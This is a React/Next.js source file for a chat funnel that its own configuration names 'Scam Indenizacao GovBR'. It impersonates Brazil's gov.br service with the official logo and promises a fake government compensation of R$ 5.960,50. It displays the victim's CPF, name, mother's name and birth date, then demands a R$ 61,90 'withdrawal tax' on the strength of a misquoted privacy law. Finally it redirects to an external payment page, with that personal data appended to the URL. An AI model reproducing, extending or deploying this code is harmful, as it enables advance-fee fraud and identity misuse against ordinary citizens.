
"use client";

import React, { useState, useEffect, useRef, useMemo } from 'react';
import { useRouter } from 'next/navigation'; 
import Image from 'next/image';
import { Loader2, VolumeX, CheckCircle, AlertTriangle } from 'lucide-react';
import dynamic from 'next/dynamic';
import type PlyrInstance from 'plyr';
import 'plyr-react/plyr.css';

const Plyr = dynamic(() => import('plyr-react'), {
  ssr: false,
});

export interface SimulatedChatParams {
  gclid?: string;
  utm_source?: string;
  utm_campaign?: string;
  utm_medium?: string;
  utm_content?: string;
  cpf?: string;
  nome?: string;
  mae?: string;
  nascimento?: string;
}

interface Message {
  id: string;
  sender: 'bot' | 'user';
  text?: string;
  options?: ChatOption[];
  isTyping?: boolean;
  displayTitle?: string;
  displayDetails?: Record<string, string>;
  displayIcon?: 'success_checkmark' | 'alert';
  displayImageUrl?: string;
  displayImageAlt?: string;
  displayImageAiHint?: string;
}

interface ChatOption {
  text: string;
  nextStep?: string;
  action?: 'redirectToPayment';
  paymentUrl?: string;
}

interface StepDataVideo {
  title: string;
  videoUrl: string;
}

interface StepDataMultipleChoice {
  message: string;
  options: ChatOption[];
}

interface StepDataLoading {
  message: string;
  duration_ms: number;
}

interface StepDataDisplayMessage {
  title?: string;
  message?: string;
  icon?: 'success_checkmark' | 'alert';
  details?: Record<string, string>;
  audioUrl?: string;
}

interface StepDataDisplayImage {
  message?: string; // Optional message to accompany image
  imageUrl: string;
  imageAiHint?: string;
}

interface FlowStep {
  type: 'video' | 'multipleChoice' | 'loading' | 'displayMessage' | 'displayImage';
  data: StepDataVideo | StepDataMultipleChoice | StepDataLoading | StepDataDisplayMessage | StepDataDisplayImage;
  nextStep?: string;
}

interface FunnelData {
  funnelName: string;
  initialStep: string;
  steps: Record<string, FlowStep>;
}

const funnelDefinition: FunnelData = {
    "funnelName": "Scam Indenizacao GovBR",
    "initialStep": "step1_video",
    "steps": {
      "step1_video": {
        "type": "video",
        "data": {
          "title": "Primeiro clique no vídeo abaixo para iniciarmos o atendimento 👇",
          "videoUrl": "https://225412.b-cdn.net/Video%20Page.mp4" 
        },
        "nextStep": "step2_ask_mother_name"
      },
      "step2_ask_mother_name": {
        "type": "multipleChoice",
        "data": {
          "message": "Nos últimos dias, milhares de brasileiros conseguiram sacar essa indenização do governo.\n\nResponda às perguntas a seguir para aprovação do seu saque de R$ 5.960,50.\n\nPor favor, confirme o nome de sua mãe.",
          "options": [
            {"text": "Raquel Queiroz Santos", "nextStep": "step3_ask_gov_app"},
            {"text": "Fernanda de Sousa Rodrigues", "nextStep": "step3_ask_gov_app"},
            {"text": "{mae}", "nextStep": "step3_ask_gov_app"}, 
            {"text": "Nenhuma das alternativas.", "nextStep": "step3_ask_gov_app"}
          ]
        }
      },
      "step3_ask_gov_app": {
        "type": "multipleChoice",
        "data": {
          "message": "Você já instalou ou acessou o GOV no seu celular?",
          "options": [
            {"text": "Sim", "nextStep": "step4_ask_civil_status"},
            {"text": "Não", "nextStep": "step4_ask_civil_status"}
          ]
        }
      },
      "step4_ask_civil_status": {
        "type": "multipleChoice",
        "data": {
          "message": "Qual seu estado civil?",
          "options": [
            {"text": "Solteiro (a)", "nextStep": "step5_loading_validation"},
            {"text": "Casado (a)", "nextStep": "step5_loading_validation"},
            {"text": "Divorciado (a)", "nextStep": "step5_loading_validation"},
            {"text": "Viúvo (a)", "nextStep": "step5_loading_validation"}
          ]
        }
      },
      "step5_loading_validation": {
        "type": "loading",
        "data": {
          "message": "Validando suas respostas...",
          "duration_ms": 3000
        },
        "nextStep": "step6_confirmation"
      },
      "step6_confirmation": {
        "type": "displayMessage",
        "data": {
          "title": "Autenticidade confirmada!",
          "icon": "success_checkmark",
          "details": { 
            "Nome": "{nome}",
            "CPF": "{cpf}",
            "Data de Nascimento": "{nascimento}",
            "Indenização": "R$ 5.960,50",
            "Status": "Pré-aprovado"
          },
          "audioUrl": "https://placehold.co/audio_aprovado.mp3" 
        },
        "nextStep": "step7_ask_pix_type"
      },
      "step7_ask_pix_type": {
        "type": "multipleChoice",
        "data": {
          "message": "Selecione a chave PIX que deseja usar:",
          "options": [
            {"text": "Telefone", "nextStep": "step8_confirm_pix_key"},
            {"text": "CPF", "nextStep": "step8_confirm_pix_key"},
            {"text": "Email", "nextStep": "step8_confirm_pix_key"}
          ]
        }
      },
      "step8_confirm_pix_key": {
        "type": "multipleChoice",
        "data": {
          "message": "ATENÇÃO: Verifique se a chave Pix informada está correta.\n\nChave: {cpf}\n\nO governo não se responsabiliza caso você informe a Chave PIX errada.",
          "options": [
            {"text": "Sim, está correto.", "nextStep": "step9_registering_pix"},
            {"text": "Não, desejo corrigir.", "nextStep": "step7_ask_pix_type"}
          ]
        }
      },
      "step9_registering_pix": {
        "type": "loading",
        "data": {
          "message": "Aguarde alguns segundos, estamos cadastrando sua chave PIX no sistema...",
          "duration_ms": 2500
        },
        "nextStep": "step10_pix_registered"
      },
      "step10_pix_registered": {
          "type": "displayMessage",
          "data": {
            "title": "Chave PIX Cadastrada",
            "icon": "success_checkmark",
            "message": "Sua chave pix foi cadastrada com sucesso!",
            "details": { 
              "Nome": "{nome}",
              "Chave Pix": "{cpf}",
              "Status": "Aprovado"
            },
            "audioUrl": "https://placehold.co/audio_chave_cadastrada.mp3" 
          },
          "nextStep": "step11_ask_generate_receipt"
      },
      "step11_ask_generate_receipt": {
          "type": "multipleChoice",
          "data": {
              "message": "Clique no botão abaixo para confirmar e liberar o envio da sua indenização para a chave PIX informada.\n\nIremos gerar seu comprovante do valor de R$ 5.960,50 neste instante.",
              "options": [
                  {"text": "Desejo receber meu comprovante de recebimento.", "nextStep": "step12_generate_receipt"}
              ]
          }
      },
      "step12_generate_receipt": {
          "type": "displayImage",
          "data": {
              "message": "Gerando seu comprovante de recebimento dos valores...",
              "imageUrl": "https://placehold.co/600x400.png", 
              "imageAiHint": "receipt document"
          },
          "nextStep": "step13_reveal_tax"
      },
      "step13_reveal_tax": {
          "type": "displayMessage",
          "data": {
              "title": "Indenização Governamental",
              "details": { 
                  "Indenização disponível para saque": "R$ 5.960,50",
                  "Titular": "{nome}",
                  "Chave Pix": "{cpf}",
                  "Imposto de Saque": "R$ 61,90"
              }
          },
          "nextStep": "step14_explain_tax"
      },
      "step14_explain_tax": {
          "type": "multipleChoice",
          "data": {
              "message": "⚠️ Seu dinheiro está vinculado ao seu CPF e somente você pode acessá-lo.\n\nPortanto, a taxa transacional paga ao solicitar o saque, não pode ser descontada do valor total que você tem a receber, devido à Lei que protege os direitos fundamentais de Privacidade e Segurança.\n\nLei n.º 13.709 de 14 de agosto de 2018",
              "options": [
                  {"text": "Concluir pagamento e receber minha indenização", "action": "redirectToPayment", "paymentUrl": "https://pay.finalizeseupagamento.com/2wq7Gr7YK5jgBAN"}
              ]
          }
      }
    }
  };


const SimulatedChatFlow: React.FC<{ initialParams: SimulatedChatParams }> = ({ initialParams }) => {
  const [messages, setMessages] = useState<Message[]>([]);
  const [currentStepKey, setCurrentStepKey] = useState<string>(funnelDefinition.initialStep);
  const [isBotTyping, setIsBotTyping] = useState(true);
  const chatEndRef = useRef<HTMLDivElement>(null);
  const audioRef = useRef<HTMLAudioElement>(null);
  const router = useRouter();

  const playerRef = useRef<PlyrInstance | null>(null);
  const [showVideoThumbnailOverlay, setShowVideoThumbnailOverlay] = useState(true);
  const [currentVideoUrl, setCurrentVideoUrl] = useState<string | null>(null);

  const [isLoadingStep, setIsLoadingStep] = useState(false);
  const [loadingMessage, setLoadingMessage] = useState<string | null>(null);

  const [currentImageDetails, setCurrentImageDetails] = useState<{url: string; alt: string; message?: string, aiHint?: string} | null>(null);
  const [currentDisplayMessage, setCurrentDisplayMessage] = useState<Message | null>(null);

  const prevCurrentStepKeyRef = useRef<string>();
  const autoTransitionTimerRef = useRef<NodeJS.Timeout | null>(null);

  const formatText = (text: string | undefined): string => {
    if (!text) return '';
    return text
      .replace(/{nome}/g, initialParams.nome || 'Usuário')
      .replace(/{cpf}/g, initialParams.cpf || 'CPF não informado')
      .replace(/{mae}/g, initialParams.mae || 'Nome da mãe não informado')
      .replace(/{nascimento}/g, initialParams.nascimento || 'Data de nasc. não informada');
  };

  const formatDetailsObject = (details: Record<string, string> | undefined): Record<string, string> | undefined => {
    if (!details) return undefined;
    const formatted: Record<string, string> = {};
    for (const key in details) {
      formatted[key] = formatText(details[key]);
    }
    return formatted;
  };

  useEffect(() => {
    chatEndRef.current?.scrollIntoView({ behavior: 'smooth' });
  }, [messages, isLoadingStep, currentImageDetails, currentDisplayMessage, currentVideoUrl]);

  useEffect(() => {
    if (autoTransitionTimerRef.current) {
      clearTimeout(autoTransitionTimerRef.current);
      autoTransitionTimerRef.current = null;
    }

    const stepConfig = funnelDefinition.steps[currentStepKey];
    if (!stepConfig) {
      console.error("SimulatedChatFlow: Invalid step key:", currentStepKey);
      setMessages(prev => [...prev, {id: `err-${Date.now()}`, sender: 'bot', text: "Desculpe, ocorreu um erro no fluxo."}]);
      setIsBotTyping(false);
      return;
    }

    const isNewStep = prevCurrentStepKeyRef.current !== currentStepKey;
    prevCurrentStepKeyRef.current = currentStepKey;

    setIsBotTyping(true);
    setIsLoadingStep(false);
    setLoadingMessage(null);
    setCurrentImageDetails(null);
    setCurrentDisplayMessage(null);
    
    if (stepConfig.type !== 'video' && isNewStep) {
      setCurrentVideoUrl(null); // Clear video if moving to a non-video step
    }


    const processStep = async () => {
      const botMessageId = `bot-${Date.now()}`;
      let nextStepTransitionDelay = 1200; 

      switch (stepConfig.type) {
        case 'video': {
          const data = stepConfig.data as StepDataVideo;
          setCurrentVideoUrl(data.videoUrl);
          setShowVideoThumbnailOverlay(true);
          if (data.title && isNewStep) {
            setMessages(prev => [...prev, { id: botMessageId, sender: 'bot', text: formatText(data.title) }]);
          }
          setIsBotTyping(false);
          return; 
        }
        case 'multipleChoice': {
          const data = stepConfig.data as StepDataMultipleChoice;
          const formattedOptions = data.options.map(opt => ({
            ...opt,
            text: formatText(opt.text)
          }));
          if (isNewStep) {
            setMessages(prev => [...prev, { id: botMessageId, sender: 'bot', text: formatText(data.message), options: formattedOptions }]);
          } else if (messages[messages.length-1]?.options?.length !== formattedOptions.length) { // Ensure options are resent if they differ (e.g. due to param update)
            setMessages(prev => {
                const lastMsg = prev[prev.length -1];
                if(lastMsg.sender === 'bot' && lastMsg.text === formatText(data.message)){ // update last message if text is same
                    return [...prev.slice(0, -1), {...lastMsg, options: formattedOptions}];
                }
                return [...prev, { id: botMessageId, sender: 'bot', text: formatText(data.message), options: formattedOptions }];
            });
          }
          break;
        }
        case 'loading': {
          const data = stepConfig.data as StepDataLoading;
          setLoadingMessage(formatText(data.message));
          setIsLoadingStep(true);
          setIsBotTyping(false); 
          autoTransitionTimerRef.current = setTimeout(() => {
            setIsLoadingStep(false);
            setLoadingMessage(null);
            if (stepConfig.nextStep) {
              setCurrentStepKey(stepConfig.nextStep);
            }
          }, data.duration_ms);
          return; 
        }
        case 'displayMessage': {
          const data = stepConfig.data as StepDataDisplayMessage;
          const displayMsg: Message = {
            id: botMessageId,
            sender: 'bot',
            displayTitle: formatText(data.title),
            text: data.message ? formatText(data.message) : undefined,
            displayDetails: formatDetailsObject(data.details),
            displayIcon: data.icon,
          };
          setCurrentDisplayMessage(displayMsg); 

          if (data.audioUrl && audioRef.current) {
            audioRef.current.src = data.audioUrl;
            audioRef.current.play().catch(e => console.warn("Audio autoplay failed:", e));
          }
          nextStepTransitionDelay = 3500; 
          break;
        }
        case 'displayImage': {
          const data = stepConfig.data as StepDataDisplayImage;
           if (data.message && isNewStep) {
             setMessages(prev => [...prev, { id: botMessageId, sender: 'bot', text: formatText(data.message) }]);
           }
          setCurrentImageDetails({url: data.imageUrl, alt: "Comprovante", message: data.message ? formatText(data.message) : undefined, aiHint: data.imageAiHint || 'document image'});
          nextStepTransitionDelay = 4000; 
          break;
        }
        default:
          console.error("SimulatedChatFlow: Unknown step type:", (stepConfig as any).type);
          setMessages(prev => [...prev, {id: `err-type-${Date.now()}`, sender: 'bot', text: "Erro: tipo de passo desconhecido."}]);
      }

      setIsBotTyping(false);

      if (stepConfig.nextStep && stepConfig.type !== 'multipleChoice' && stepConfig.type !== 'video' && stepConfig.type !== 'loading') {
        if (isNewStep) { // Only auto-transition if it's a genuinely new step
            autoTransitionTimerRef.current = setTimeout(() => {
            setCurrentStepKey(stepConfig.nextStep as string);
          }, nextStepTransitionDelay);
        }
      }
    };
    
    const appearanceDelay = (stepConfig.type === 'loading' || (isNewStep && currentStepKey === funnelDefinition.initialStep)) ? 0 : 700;
    setTimeout(processStep, appearanceDelay);

    return () => {
      if (autoTransitionTimerRef.current) {
        clearTimeout(autoTransitionTimerRef.current);
        autoTransitionTimerRef.current = null;
      }
    };
  // eslint-disable-next-line react-hooks/exhaustive-deps
  }, [currentStepKey, initialParams]); 

  const handleOptionClick = (option: ChatOption) => {
    const userMessageId = `user-${Date.now()}`;
    setMessages(prev => [...prev, { id: userMessageId, sender: 'user', text: option.text }]);

    if (option.action === 'redirectToPayment' && option.paymentUrl) {
        let finalPaymentUrl = option.paymentUrl;
        const url = new URL(finalPaymentUrl);
        Object.entries(initialParams).forEach(([key, value]) => {
            if (value && !url.searchParams.has(key)) {
                url.searchParams.set(key, value);
            }
        });
        if (initialParams.cpf && !url.searchParams.has('document')) { 
            url.searchParams.set('document', initialParams.cpf.replace(/\D/g, ''));
        }
        if (initialParams.nome && !url.searchParams.has('name')) {
            url.searchParams.set('name', initialParams.nome);
        }
        window.location.href = url.toString();
    } else if (option.nextStep) {
      setCurrentStepKey(option.nextStep);
    }
  };
  
  const handleVideoThumbnailClick = async () => {
    const stepConfig = funnelDefinition.steps[currentStepKey];
    if (stepConfig?.type !== 'video') return;

    if (playerRef.current?.plyr) {
      try {
        playerRef.current.plyr.muted = false;
        await playerRef.current.plyr.play();
        setShowVideoThumbnailOverlay(false);
        
        if (stepConfig.nextStep) {
          autoTransitionTimerRef.current = setTimeout(() => { // Use timer for consistency
            setCurrentStepKey(stepConfig.nextStep as string);
          }, 500); 
        }
      } catch (error) {
        console.error("Error trying to play/unmute video:", error);
        if (stepConfig.nextStep) setCurrentStepKey(stepConfig.nextStep as string); 
      }
    } else {
        if (stepConfig.nextStep) setCurrentStepKey(stepConfig.nextStep as string);
    }
  };

  const plyrSource = useMemo(() => currentVideoUrl ? ({
    type: 'video' as const,
    sources: [{ src: currentVideoUrl, provider: 'html5' as const }],
  }) : null, [currentVideoUrl]);

  const plyrOptions = useMemo(() => ({
    controls: [],
    hideControls: true,
    clickToPlay: false,
    autoplay: true,
    muted: true,
    playsinline: true,
  }), []);

  return (
    <div className="simulated-chat-container" style={{ height: '100%', overflowY: 'auto', display: 'flex', flexDirection: 'column', padding: '10px', backgroundColor: '#f0f0f0' }}>
      <audio ref={audioRef} style={{ display: 'none' }} />

      {currentVideoUrl && plyrSource && (
        <div className="intro-video-section" style={{ marginBottom: '15px', padding: '10px', background: '#fff', borderRadius: '8px', boxShadow: '0 2px 10px rgba(0,0,0,0.1)' }}>
          <div className="video-player-wrapper" style={{ position: 'relative', maxWidth: '100%', width:'auto', aspectRatio: '16/9', margin: '0 auto', borderRadius: '8px', overflow: 'hidden' }}>
            <Plyr
              ref={playerRef}
              source={plyrSource}
              options={plyrOptions}
            />
            {showVideoThumbnailOverlay && (
              <div
                onClick={handleVideoThumbnailClick}
                style={{
                  position: 'absolute', top: 0, left: 0, right: 0, bottom: 0,
                  background: 'rgba(0,0,0,0.6)', display: 'flex', flexDirection: 'column',
                  justifyContent: 'center', alignItems: 'center', cursor: 'pointer', color: 'white', zIndex: 10
                }}
              >
                <VolumeX size={48} />
                <span style={{ marginTop: '10px', fontSize: '18px' }}>Clique para Ouvir</span>
              </div>
            )}
          </div>
        </div>
      )}

      {isLoadingStep && loadingMessage && (
        <div className="loading-step-container" style={{ textAlign: 'center', padding: '20px', background: '#fff', borderRadius: '8px', margin: '10px 0', boxShadow: '0 2px 10px rgba(0,0,0,0.1)'}}>
          <Loader2 className="animate-spin" size={32} style={{ margin: '0 auto 10px auto', color: '#007bff' }} />
          <p style={{ fontSize: '16px', color: '#333' }}>{loadingMessage}</p>
        </div>
      )}

      {currentImageDetails && (
        <div className="image-step-container" style={{ textAlign: 'center', padding: '15px', background: '#fff', borderRadius: '8px', margin: '10px 0', boxShadow: '0 2px 10px rgba(0,0,0,0.1)' }}>
          {currentImageDetails.message && <p style={{ marginBottom: '10px', fontSize: '16px', color: '#333' }}>{currentImageDetails.message}</p>}
          <Image src={currentImageDetails.url} alt={currentImageDetails.alt} width={400} height={300} style={{ maxWidth: '100%', height: 'auto', borderRadius: '4px', border: '1px solid #eee' }} data-ai-hint={currentImageDetails.aiHint}/>
        </div>
      )}
      
      {currentDisplayMessage && (
        <div className={`message-container bot-message-container display-message-block`} style={{alignSelf: 'flex-start', maxWidth: '90%'}}>
           <Image src="https://sso.acesso.gov.br/assets/govbr/img/govbr.png" alt="Bot Avatar" className="bot-avatar" width={32} height={32} />
           <div className="message bot-message" style={{width: '100%'}}>
              {currentDisplayMessage.displayTitle && <h3 style={{ fontWeight: 'bold', marginBottom: '8px', fontSize: '17px', color: '#0056b3' }}>
                {currentDisplayMessage.displayIcon === 'success_checkmark' && <CheckCircle size={20} style={{ color: 'green', marginRight: '8px', verticalAlign: 'bottom' }} />}
                {currentDisplayMessage.displayIcon === 'alert' && <AlertTriangle size={20} style={{ color: 'orange', marginRight: '8px', verticalAlign: 'bottom' }} />}
                {currentDisplayMessage.displayTitle}
              </h3>}
              {currentDisplayMessage.text && <p style={{ marginBottom: currentDisplayMessage.displayDetails ? '12px' : '0', whiteSpace: 'pre-line' }}>{currentDisplayMessage.text}</p>}
              {currentDisplayMessage.displayDetails && (
                <div className="details-grid" style={{ borderTop: '1px solid #e0e0e0', paddingTop: '10px', display: 'grid', gridTemplateColumns: 'auto 1fr', gap: '6px 12px', fontSize: '14px' }}>
                  {Object.entries(currentDisplayMessage.displayDetails).map(([key, value]) => (
                    <React.Fragment key={key}>
                      <span style={{ fontWeight: '500', color: '#555' }}>{key}:</span>
                      <span style={{ color: '#333' }}>{value}</span>
                    </React.Fragment>
                  ))}
                </div>
              )}
           </div>
        </div>
      )}


      {messages.map((msg) => (
          <div key={msg.id} className={`message-container ${msg.sender === 'bot' ? 'bot-message-container' : 'user-message-container'}`}>
            {msg.sender === 'bot' && (
              <Image src="https://sso.acesso.gov.br/assets/govbr/img/govbr.png" alt="Bot Avatar" className="bot-avatar" width={32} height={32} />
            )}
            <div className={`message ${msg.sender === 'bot' ? 'bot-message' : 'user-message'}`}>
              {msg.text && <span style={{whiteSpace: 'pre-line'}}>{msg.text}</span>}
              {msg.sender === 'bot' && msg.options && !isBotTyping && (
                <div className="options-container" style={{ marginTop: msg.text ? '10px' : '0', display: 'flex', flexDirection: 'column', gap: '8px' }}>
                  {msg.options.map(opt => (
                    <button
                      key={opt.text} 
                      onClick={() => handleOptionClick(opt)}
                      className="chat-option-button"
                    >
                      {opt.text}
                    </button>
                  ))}
                </div>
              )}
            </div>
          </div>
        )
      )}
      {isBotTyping && (
         <div className="message-container bot-message-container">
            <Image src="https://sso.acesso.gov.br/assets/govbr/img/govbr.png" alt="Bot Avatar" className="bot-avatar" width={32} height={32} />
            <div className="message bot-message typing-indicator">
                <span className="dot"></span>
                <span className="dot"></span>
                <span className="dot"></span>
            </div>
        </div>
      )}
      <div ref={chatEndRef} />
      <style jsx>{`
        .message-container {
          display: flex;
          margin-bottom: 12px;
          max-width: 85%;
        }
        .bot-message-container {
          align-self: flex-start;
        }
        .user-message-container {
          align-self: flex-end;
          flex-direction: row-reverse; 
        }
        .bot-avatar { /* Applied to Image component via className */
          width: 32px;
          height: 32px;
          border-radius: 50%;
          margin-right: 8px;
          margin-top: 4px; 
          align-self: flex-start; 
        }
        .user-message-container .bot-avatar { 
          display: none;
        }
        .message {
          padding: 10px 15px;
          border-radius: 18px;
          line-height: 1.4;
          font-size: 15px;
          word-wrap: break-word;
          box-shadow: 0 1px 2px rgba(0,0,0,0.1);
        }
        .bot-message {
          background-color: #fff; 
          color: #333;
          border-top-left-radius: 4px;
        }
        .user-message {
          background-color: #007bff; 
          color: white;
          border-top-right-radius: 4px;
          margin-right: 0; 
        }
        .user-message-container .user-message {
            margin-left: auto; 
        }

        .options-container {
          margin-top: 10px;
          display: flex;
          flex-direction: column; 
          align-items: flex-start; 
          gap: 8px;
        }
        .chat-option-button {
          background-color: #fff;
          color: #007bff;
          border: 1px solid #007bff;
          padding: 8px 15px;
          border-radius: 15px;
          cursor: pointer;
          font-size: 14px;
          transition: background-color 0.2s, color 0.2s;
          text-align: left;
          width: auto; 
          display: inline-block; 
          box-shadow: 0 1px 1px rgba(0,0,0,0.05);
        }
        .chat-option-button:hover {
          background-color: #007bff;
          color: #fff;
        }
        .typing-indicator {
            display: inline-flex;
            align-items: center;
            padding: 10px 15px; 
        }
        .typing-indicator .dot {
            width: 8px;
            height: 8px;
            margin: 0 2px;
            background-color: #aaa; 
            border-radius: 50%;
            animation: bounce 1.4s infinite;
        }
        .typing-indicator .dot:nth-child(2) {
            animation-delay: 0.2s;
        }
        .typing-indicator .dot:nth-child(3) {
            animation-delay: 0.4s;
        }
        @keyframes bounce {
            0%, 80%, 100% { transform: scale(0); }
            40% { transform: scale(1); }
        }
        .display-message-block .bot-message { 
            width: 100%; 
        }
      `}</style>
    </div>
  );
};

export default SimulatedChatFlow;
